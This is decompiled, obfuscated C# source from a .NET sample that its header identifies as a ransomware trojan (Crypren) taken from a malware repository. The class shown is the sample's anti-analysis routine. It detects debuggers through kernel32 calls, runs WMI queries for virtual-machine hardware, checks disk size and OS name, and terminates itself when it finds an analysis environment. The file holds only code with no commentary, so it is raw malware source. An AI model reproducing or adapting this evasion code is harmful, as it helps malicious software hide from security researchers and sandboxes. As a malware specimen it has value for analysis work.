// Decompiled with JetBrains decompiler
// Type: cmxGDwJsHiH.YsaeTaXmVFhz
// Assembly: client1122, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C74D9760-F9BD-4A1E-9145-1F0BB7E43FF5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.MSIL.Crypren.gen-27ba35dbeb5324bd780ae6a95c5aae93fcb47c5aa8f48b1c21f83000a55de2da.exe

using Microsoft.VisualBasic.Devices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;

namespace cmxGDwJsHiH
{
  internal sealed class YsaeTaXmVFhz
  {
    [NonSerialized]
    internal static GetString \u0086;

    public static void BxJfkSaAEewP()
    {
      if (YsaeTaXmVFhz.DRINXtCaQNjnsg() || YsaeTaXmVFhz.oVfSIQwYSlmnPaF() || YsaeTaXmVFhz.qKEEoKIOORER() || YsaeTaXmVFhz.wIfoFzSqhyuy() || YsaeTaXmVFhz.FkOElOFjdZDU())
        Process.GetCurrentProcess().Kill();
      Environment.FailFast((string) null);
    }

    private static bool wIfoFzSqhyuy()
    {
      try
      {
        long num = 61000000000;
        if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= num)
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool FkOElOFjdZDU()
    {
      try
      {
        if (new ComputerInfo().OSFullName.ToLower().Contains(YsaeTaXmVFhz.\u0086(107409647)))
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool DRINXtCaQNjnsg()
    {
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(YsaeTaXmVFhz.\u0086(107409674)))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            foreach (ManagementBaseObject managementBaseObject in objectCollection)
            {
              string lower = managementBaseObject[YsaeTaXmVFhz.\u0086(107409593)].ToString().ToLower();
              if (lower == YsaeTaXmVFhz.\u0086(107409608) && managementBaseObject[YsaeTaXmVFhz.\u0086(107409579)].ToString().ToUpperInvariant().Contains(YsaeTaXmVFhz.\u0086(107409570)) || lower.Contains(YsaeTaXmVFhz.\u0086(107410037)) || managementBaseObject[YsaeTaXmVFhz.\u0086(107409579)].ToString() == YsaeTaXmVFhz.\u0086(107410028))
                return true;
            }
          }
        }
      }
      catch
      {
      }
      return false;
    }

    private static bool oVfSIQwYSlmnPaF()
    {
      bool flag = false;
      try
      {
        YsaeTaXmVFhz.RygZYcYNsDwi(Process.GetCurrentProcess().Handle, ref flag);
        return flag;
      }
      catch
      {
        return flag;
      }
    }

    private static bool qKEEoKIOORER()
    {
      try
      {
        return YsaeTaXmVFhz.nYSsBBurPalp(YsaeTaXmVFhz.\u0086(107410011)).ToInt32() != 0;
      }
      catch
      {
        return false;
      }
    }

    [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle")]
    public static extern IntPtr nYSsBBurPalp([In] string obj0);

    [DllImport("kernel32.dll", EntryPoint = "CheckRemoteDebuggerPresent", SetLastError = true)]
    private static extern bool RygZYcYNsDwi([In] IntPtr obj0, [In] ref bool obj1);

    static YsaeTaXmVFhz() => Strings.CreateGetStringDelegate(typeof (YsaeTaXmVFhz));
  }
}
